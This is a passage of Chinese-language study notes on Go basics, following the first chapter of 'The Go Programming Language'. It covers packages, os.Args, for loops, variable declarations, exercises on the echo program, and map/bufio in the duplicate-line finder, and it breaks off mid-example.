世界\n</code></pre></div><h3>package/import</h3>\n<ul>\n<li>Go代码结构</li>\n</ul>\n<p>Go语言的代码通过<code>包（package）</code>组织，包类似于其它语言里的库（libraries）或者模块（modules）。一个包由位于<code>单个目录</code>下的一个或多个.go源代码文件组成</p>\n<blockquote>\n<p>也就是说，一个文件夹下的go文件应该属于同一个包</p>\n</blockquote>\n<p><code>main</code>包比较特殊。它定义了一个独立可执行的程序，而不是一个库。在<code>main</code>里的<code>main</code> 函数也很特殊，它是整个程序执行时的入口（译注：C系语言差不多都这样）。</p>\n<p>每个源文件都以一条<code>package</code>声明语句开始，例子里的<code>package main</code>，表示该文件属于哪个包，紧跟着一系列导入（<code>import</code>）的包，<strong><code>import</code> 声明必须跟在文件的 <code>package</code> 声明之后</strong>。</p>\n<blockquote>\n<p>⚠️ 必须恰当导入需要的包，<strong>缺少了必要的包或者导入了不需要的包，程序都无法编译通过</strong>。这项严格要求避免了程序开发过程中引入未使用的包❗</p>\n</blockquote>\n<p>之后是这个文件里的其他程序语句，是组成程序的函数、变量、常量、类型的声明语句（分别由关键字 <code>func</code>、<code>var</code>、<code>const</code>、<code>type</code> 定义）。</p>\n<ul>\n<li>\n<p>Go 语言不需要在语句或者声明的末尾添加分号，除非一行上有多条语句。编译器会主动把特定符号后的换行符转换为分号</p>\n<p>例子，函数的左括号 <code>{</code> 必须和 <code>func</code> 函数声明在同一行上，且位于末尾，不能独占一行，而在表达式 <code>x+y</code> 中，可在 <code>+</code> 后换行，不能在 <code>+</code> 前换行（译注：以+结尾的话不会被插入分号分隔符，但是以 x 结尾的话则会被分号分隔符，从而导致编译错误）。</p>\n</li>\n<li>\n<p>Go 语言在代码格式上采取了很强硬的态度。<code>gofmt</code>工具把代码格式化为标准格式</p>\n<p>很多文本编辑器都可以配置为保存文件时自动执行 <code>gofmt</code>，这样你的源代码总会被恰当地格式化。还有个相关的工具：<code>goimports</code>，可以根据代码需要，自动地添加或删除 <code>import</code> 声明。这个工具并没有包含在标准的分发包中，可以用下面的命令安装：</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>go <span class=\"token function\">install</span> golang.org/x/tools/cmd/goimports@latest\n</code></pre></div></li>\n</ul>\n<h2>1.2. 命令行参数</h2>\n<p>示例代码</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"fmt\"</span>\n\t<span class=\"token string\">\"os\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">var</span> s<span class=\"token punctuation\">,</span> sep <span class=\"token builtin\">string</span>\n\t<span class=\"token comment\">// var 声明定义了两个 string 类型的变量 s 和 sep。变量会在声明时直接初始化。</span>\n\t<span class=\"token comment\">// 如果变量没有显式初始化，则被隐式地赋予其类型的零值，数值类型是0，字符串类型是空字符串\"\"</span>\n\n\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\ts <span class=\"token operator\">+=</span> sep <span class=\"token operator\">+</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span>\n\t\t<span class=\"token comment\">// 对 string 类型，+ 运算符连接字符串</span>\n\t\t<span class=\"token comment\">// 等价于：s=s+sep+os.Args[i]。</span>\n\t\tsep <span class=\"token operator\">=</span> <span class=\"token string\">\" \"</span>\n\t<span class=\"token punctuation\">}</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h3>切片</h3>\n<ul>\n<li>\n<p>程序的命令行参数可从 <code>os</code> 包的 <code>Args</code> 变量获取；<code>os</code> 包外部使用 <code>os.Args</code> 访问该变量。<code>os.Args</code> 变量是一个字符串（string）的<code>切片（slice）</code>。</p>\n</li>\n<li>\n<p><code>os.Args</code> 的第一个元素：<code>os.Args[0]</code>，是命令本身的名字；其它的元素则是程序启动时传给它的参数。</p>\n</li>\n<li>\n<p><code>s[m:n]</code> 形式的切片表达式，产生从第 <code>m</code> 个元素到第 <code>n-1</code> 个元素的切片，如果省略切片表达式的索引，会默认传入 <code>0</code> 或 <code>len(s)</code>。（区间索引时，Go 语言里也采用左闭右开形式）<code>os.Args[1:len(os.Args)]</code> 切片，可以简写成 <code>os.Args[1:]</code></p>\n</li>\n</ul>\n<blockquote>\n<p>注释语句以 <code>//</code> 开头。</p>\n</blockquote>\n<h3>s+=  i++</h3>\n<p>上面<code>s += sep + os.Args[i]</code>等价于：<code>s=s+sep+os.Args[i]</code>。看起来和其他语言一样的，但是</p>\n<blockquote>\n<p>自增语句 <code>i++</code> 给 <code>i</code> 加 <code>1</code>；这和 <code>i+=1</code> 以及 <code>i=i+1</code> 都是等价的。对应的还有 <code>i--</code> 给 <code>i</code> 减 <code>1</code>。它们是语句，而不像 C 系的其它语言那样是表达式。所以 <code>j=i++</code> 非法，而且 <code>++</code> 和 <code>--</code> 都只能放在变量名后面，因此 <code>--i</code> 也非法。</p>\n</blockquote>\n<h3>for循环</h3>\n<p>Go 语言只有 <code>for</code> 循环这一种循环语句。<code>for</code> 循环有多种形式，</p>\n<p><strong>for循环1</strong></p>\n<p>其中一种如下所示：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">for</span> initialization<span class=\"token punctuation\">;</span> condition<span class=\"token punctuation\">;</span> post <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// zero or more statements</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p><code>for</code> 循环三个部分不需括号包围。大括号强制要求，左大括号必须和 <em><code>post</code></em> 语句在同一行。</p>\n<ul>\n<li><code>initialization</code> 语句是可选的，在循环开始前执行。<code>initalization</code>如果存在，必须是一条 <em>简单语句</em>（simple statement），即，短变量声明、自增语句、赋值语句或函数调用。</li>\n<li><code>condition</code> 是一个布尔表达式（boolean expression），其值在每次循环迭代开始时计算。如果为 <code>true</code> 则执行循环体语句。</li>\n<li><code>post</code> 语句在循环体执行结束后执行，之后再次对 <code>condition</code> 求值。<code>condition</code> 值为 <code>false</code> 时，循环结束。</li>\n</ul>\n<p>for 循环的这三个部分<strong>每个都可以省略</strong>，如果省略 <code>initialization</code> 和 <code>post</code>，分号也可以省略：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// a traditional \"while\" loop</span>\n<span class=\"token keyword\">for</span> condition <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>如果连 <code>condition</code> 也省略了，像下面这样：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// a traditional infinite loop</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>这就变成一个无限循环，尽管如此，还可以用其他方式终止循环，如一条 <code>break</code> 或 <code>return</code> 语句。</p>\n<p><strong>for循环2</strong></p>\n<p>在某种数据类型的区间（range）上遍历，如字符串或切片。例如</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// Echo2 prints its command-line arguments.</span>\n<span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n    <span class=\"token string\">\"fmt\"</span>\n    <span class=\"token string\">\"os\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    s<span class=\"token punctuation\">,</span> sep <span class=\"token operator\">:=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span>\n    <span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> arg <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n        s <span class=\"token operator\">+=</span> sep <span class=\"token operator\">+</span> arg\n        sep <span class=\"token operator\">=</span> <span class=\"token string\">\" \"</span>\n    <span class=\"token punctuation\">}</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>空标识符</h3>\n<p>上面for循环2中，每次循环迭代，<code>range</code> 产生一对值（索引以及在该索引处的元素值）。这个例子不需要索引，一种思路是把索引赋值给一个临时变量（如 <code>temp</code>）然后忽略它的值，但 Go 语言不允许使用无用的局部变量（local variables），因为这会导致编译错误。</p>\n<p>Go 语言中这种情况的解决方法是用 <code>空标识符（blank identifier）</code>，即 <code>_</code>（下划线）。空标识符可用于在任何语法需要变量名但程序逻辑不需要的时候。</p>\n<h3>声明&amp;初始化</h3>\n<p>使用一条短变量声明来声明并初始化 <code>s</code> 和 <code>seps</code></p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>s<span class=\"token punctuation\">,</span> sep <span class=\"token operator\">:=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span>\n</code></pre></div><p>声明一个变量有好几种方式，下面这些都等价：实践中一般使用前两种形式中的某个，初始值重要的话就显式地指定变量的值，否则指定类型使用隐式初始化。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>s <span class=\"token operator\">:=</span> <span class=\"token string\">\"\"</span>\n<span class=\"token keyword\">var</span> s <span class=\"token builtin\">string</span>\n<span class=\"token keyword\">var</span> s <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n<span class=\"token keyword\">var</span> s <span class=\"token builtin\">string</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n</code></pre></div><p>第一种形式，是一条短变量声明，最简洁，但只能用在函数内部，而不能用于包变量。</p>\n<p>第二种形式依赖于字符串的默认初始化零值机制，被初始化为 <code>\"\"</code>。</p>\n<p>第三种形式用得很少，除非同时声明多个变量。</p>\n<p>第四种形式显式地标明变量的类型，当变量类型与初值类型相同时，类型冗余，但如果两者类型不同，变量类型就必须了。</p>\n<h3><code>strings</code> 包的 <code>Join</code> 函数</h3>\n<p><em>gopl.io/ch1/echo3</em></p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>strings<span class=\"token punctuation\">.</span><span class=\"token function\">Join</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>最后，如果不关心输出格式，只想看看输出值，或许只是为了调试，可以用 <code>Println</code> 为我们格式化输出。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n</code></pre></div><p>这条语句的输出结果跟 <code>strings.Join</code> 得到的结果很像，只是被放到了一对方括号里。切片都会被打印成这种格式。</p>\n<figure><figcaption>image-20240313224440655</figcaption></figure>\n<h3>练习1.1&amp;1.2</h3>\n<p>修改 <code>echo</code> 程序，使其打印每个参数的索引和值，每个一行。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// 练习 1.1： 修改 echo 程序，使其能够打印 os.Args[0]，即被执行命令本身的名字。</span>\n<span class=\"token comment\">// 练习 1.2： 修改 echo 程序，使其打印每个参数的索引和值，每个一行。</span>\n<span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"fmt\"</span>\n\t<span class=\"token string\">\"os\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\ts<span class=\"token punctuation\">,</span> sep <span class=\"token operator\">:=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> arg <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n\t\ts <span class=\"token operator\">+=</span> sep <span class=\"token operator\">+</span> arg\n\t\tsep <span class=\"token operator\">=</span> <span class=\"token string\">\" \"</span>\n\t<span class=\"token punctuation\">}</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"只输出值\"</span><span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"输出值和索引1：index, arg := range os.Args[1:]\"</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> index<span class=\"token punctuation\">,</span> arg <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"参数\"</span><span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">,</span> <span class=\"token string\">\"是\"</span><span class=\"token punctuation\">,</span> arg<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"输出值和索引2：index, arg := range os.Args\"</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token comment\">// 练习 1.1： 修改 echo 程序，使其能够打印 os.Args[0]，即被执行命令本身的名字。</span>\n\t<span class=\"token comment\">// Args[0:]的[0:]可以省略</span>\n\t<span class=\"token comment\">// for index, arg := range os.Args {</span>\n\t<span class=\"token keyword\">for</span> index<span class=\"token punctuation\">,</span> arg <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"参数\"</span><span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">,</span> <span class=\"token string\">\"是\"</span><span class=\"token punctuation\">,</span> arg<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><figure><figcaption>image-20240313230441488</figcaption></figure>\n<h3>练习 1.3</h3>\n<p>做实验测量潜在低效的版本和使用了 <code>strings.Join</code> 的版本的运行时间差异。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"fmt\"</span>\n\t<span class=\"token string\">\"os\"</span>\n\t<span class=\"token string\">\"strings\"</span>\n\t<span class=\"token string\">\"time\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">// !+</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tnow1 <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\ts<span class=\"token punctuation\">,</span> sep <span class=\"token operator\">:=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> arg <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n\t\ts <span class=\"token operator\">+=</span> sep <span class=\"token operator\">+</span> arg\n\t\tsep <span class=\"token operator\">=</span> <span class=\"token string\">\" \"</span>\n\t<span class=\"token punctuation\">}</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n\tend1 <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"for range运行时间\"</span><span class=\"token punctuation\">,</span> end1<span class=\"token punctuation\">.</span><span class=\"token function\">Sub</span><span class=\"token punctuation\">(</span>now1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tnow2 <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>strings<span class=\"token punctuation\">.</span><span class=\"token function\">Join</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tend2 <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"strings.Join运行时间\"</span><span class=\"token punctuation\">,</span> end2<span class=\"token punctuation\">.</span><span class=\"token function\">Sub</span><span class=\"token punctuation\">(</span>now2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tnow3 <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\tend3 <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Println(os.Args[1:])运行时间\"</span><span class=\"token punctuation\">,</span> end3<span class=\"token punctuation\">.</span><span class=\"token function\">Sub</span><span class=\"token punctuation\">(</span>now3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><figure><figcaption>image-20240313231229410</figcaption></figure>\n<h2>1.3. 查找重复的行</h2>\n<p>例</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>\n<span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"bufio\"</span>\n\t<span class=\"token string\">\"fmt\"</span>\n\t<span class=\"token string\">\"os\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tcounts <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 键是字符串，值是整数</span>\n\tinput <span class=\"token operator\">:=</span> bufio<span class=\"token punctuation\">.</span><span class=\"token function\">NewScanner</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stdin<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">Scan</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\tcounts<span class=\"token punctuation\">[</span>input<span class=\"token punctuation\">.</span><span class=\"token function\">Text</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">++</span>\n\t\t<span class=\"token comment\">// line := input.Text()</span>\n\t\t<span class=\"token comment\">// counts[line] = counts[line] + 1</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token comment\">// NOTE: ignoring potential errors from input.Err()</span>\n\t<span class=\"token keyword\">for</span> line<span class=\"token punctuation\">,</span> n <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> counts <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token comment\">// if 语句条件两边也不加括号。if 语句的 else 部分是可选的</span>\n\t\t<span class=\"token keyword\">if</span> n <span class=\"token operator\">&gt;</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">{</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\t%s\\n\"</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> line<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><figure><figcaption>image-20240318212619313</figcaption></figure>\n<h3>if语句</h3>\n<p>正如 <code>for</code> 循环一样，<code>if</code> 语句条件两边也不加括号，但是主体部分需要加。<code>if</code> 语句的 <code>else</code> 部分是可选的，在 <code>if</code> 的条件为 <code>false</code> 时执行。</p>\n<h3>map</h3>\n<p><strong>map</strong> 存储了键/值（key/value）的集合，对集合元素，提供常数时间的存、取或测试操作。键可以是任意类型，只要其值能用 <code>==</code> 运算符比较，最常见的例子是字符串；值则可以是任意类型。</p>\n<p>从功能和实现上说，<code>Go</code> 的 <code>map</code> 类似于 <code>Java</code> 语言中的 <code>HashMap</code>，Python 语言中的 <code>dict</code>，<code>Lua</code> 语言中的 <code>table</code>，通常使用 <code>hash</code> 实现。</p>\n<p>每次 <code>dup</code> 读取一行输入，该行被当做键存入 <code>map</code>，其对应的值递增。<code>counts[input.Text()]++</code> 语句等价下面两句：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>line <span class=\"token operator\">:=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">Text</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\ncounts<span class=\"token punctuation\">[</span>line<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> counts<span class=\"token punctuation\">[</span>line<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span>\n</code></pre></div><p><code>map</code> 中不含某个键（首次读到新行时），等号右边的表达式 <code>counts[line]</code> 的值将被计算为其类型的零值，对于 <code>int</code> 即 <code>0</code>。</p>\n<p>我们使用了基于 <code>range</code> 的循环，并在 <code>counts</code> 这个 <code>map</code> 上迭代。跟之前类似，每次迭代得到两个结果，键和其在 <code>map</code> 中对应的值。<code>map</code> 的迭代顺序并不确定，从实践来看，该顺序随机，每次运行都会变化。</p>\n<h3><code>bufio</code> 包</h3>\n<p><code>bufio</code> 包，它使处理输入和输出方便又高效。<code>Scanner</code> 类型是该包最有用的特性之一，它读取输入并将其拆成行或单词；通常是处理行形式的输入最简单的方法。</p>\n<p>程序使用短变量声明创建 <code>bufio.Scanner</code> 类型的变量 <code>input</code>。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>input <span class=\"token operator\">:=</span> bufio<span class=\"token punctuation\">.</span><span class=\"token function\">NewScanner</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stdin<span class=\"token punctuation\">)</span>\n</code></pre></div><p>该变量从程序的标准输入中读取内容。每次调用 <code>input.Scan()</code>，即读入下一行，并移除行末的换行符；读取的内容可以调用 <code>input.Text()</code> 得到。<code>Scan</code> 函数在读到一行时返回 <code>true</code>，不再有输入时返回 <code>false</code>。</p>\n<h3><code>fmt.Printf</code></h3>\n<p>对一些表达式产生格式化输出。该函数的首个参数是个格式字符串，指定后续参数被如何格式化，默认情况下，<code>Printf</code> 不会换行。</p>\n<ul>\n<li>\n<p>关于 Printf 格式化输出:</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>%d          十进制整数\n%x, %o, %b  十六进制，八进制，二进制整数。\n%f, %g, %e  浮点数： 3.141593 3.141592653589793 3.141593e+00\n%t          布尔：true或false\n%c          字符(rune)  (Unicode码点)\n%s          字符串\n%q          带双引号的字符串\"abc\"或带单引号的字符'c'\n%v          变量的自然形式(natural format) \n%T          变量的类型\n%%          字面上的百分号标志(无操作数) \n</code></pre></div></li>\n</ul>\n<p>按照惯例，以字母 <code>f</code> 结尾的格式化函数，如 <code>log.Printf</code> 和 <code>fmt.Errorf</code>，都采用 <code>fmt.Printf</code> 的格式化准则。而以 <code>ln</code> 结尾的格式化函数，则遵循 <code>Println</code> 的方式，以跟 <code>%v</code> 差不多的方式格式化参数，并在最后添加一个换行符。（译注：后缀 <code>f</code> 指 <code>format</code>，<code>ln</code> 指 <code>line</code>。）</p>\n<h3><code>os.open</code></h3>\n<p>例</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"bufio\"</span>\n\t<span class=\"token string\">\"fmt\"</span>\n\t<span class=\"token string\">\"os\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tcounts <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>\n\tfiles <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>files<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">countLines</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stdin<span class=\"token 